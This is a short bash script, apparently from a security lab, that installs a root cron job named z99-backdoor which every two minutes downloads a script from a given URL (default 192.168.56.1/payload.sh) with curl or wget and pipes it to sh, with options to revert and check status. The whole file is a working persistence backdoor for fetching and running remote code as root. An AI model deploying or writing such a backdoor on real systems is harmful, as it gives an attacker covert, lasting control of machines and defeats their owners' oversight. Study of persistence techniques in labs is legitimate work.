#!/usr/bin/env bash
set -euo pipefail

LAB_FILE="/etc/cron.d/z99-backdoor"    
CRON_SPEC="*/2 * * * *"                  #toutes les 2 minutes
CRON_USER="root"                         
SHELL_BIN="/bin/sh"                  
PATH_SAFE="/usr/sbin:/usr/bin:/sbin:/bin"

DEFAULT_URL="http://192.168.56.1/payload.sh"
PAYLOAD_URL="${1:-$DEFAULT_URL}"

log() { echo "[$(date +'%F %T')] $*"; }

usage() {
  cat <<'USAGE'
Usage:
  sudo ./cron_backdoor.sh --apply [URL]   
  sudo ./cron_backdoor.sh --revert        
  ./cron_backdoor.sh --status           
USAGE
}

ensure_root() {
  #EUID = ID effectif de l'utilisateur (0 = root)
  if [[ ${EUID:-$(id -u)} -ne 0 ]]; then
    log "sudo requis: relance en sudo…"
    exec sudo -E "$0" "$@"
  fi
}

have() { command -v "$1" >/dev/null 2>&1; }

choose_fetcher() {
  if have curl; then
    echo "curl -fsSL '$PAYLOAD_URL' | $SHELL_BIN"
  elif have wget; then
    echo "wget -qO- '$PAYLOAD_URL' | $SHELL_BIN"
  else
    log "Erreur: il faut 'curl' ou 'wget'."
    exit 1
  fi
}

reload_cron() {
  if have systemctl; then
    systemctl reload cron 2>/dev/null || systemctl restart cron
  else
    service cron reload 2>/dev/null || service cron restart
  fi
}

apply_changes() {
  ensure_root "$@"
  local cmd; cmd="$(choose_fetcher)"

  log "Écriture du job cron dans $LAB_FILE"
  cat > "$LAB_FILE" <<EOF
SHELL=$SHELL_BIN
PATH=$PATH_SAFE
$CRON_SPEC $CRON_USER $cmd
EOF

  chmod 0644 "$LAB_FILE"
  chown root:root "$LAB_FILE"

  reload_cron
  log "Backdoor cron installée. Vérifie avec: sudo nl -ba $LAB_FILE"
}

revert_changes() {
  ensure_root "$@"
  if [[ -f "$LAB_FILE" ]]; then
    log "Suppression $LAB_FILE"
    rm -f "$LAB_FILE"
    reload_cron
    log "Retiré."
  else
    log "Rien à retirer (pas de $LAB_FILE)."
  fi
}

status_file() {
  if [[ -f "$LAB_FILE" ]]; then
    log "$LAB_FILE existe :"
    nl -ba "$LAB_FILE"
  else
    log "Aucun job lab trouvé."
  fi
}

main() {
  case "${1:-}" in
    --apply)  shift; [[ $# -ge 1 ]] && PAYLOAD_URL="$1"; apply_changes "$@";;
    --revert) revert_changes ;;
    --status) status_file ;;
    *) usage; exit 1 ;;
  esac
}

main "$@"
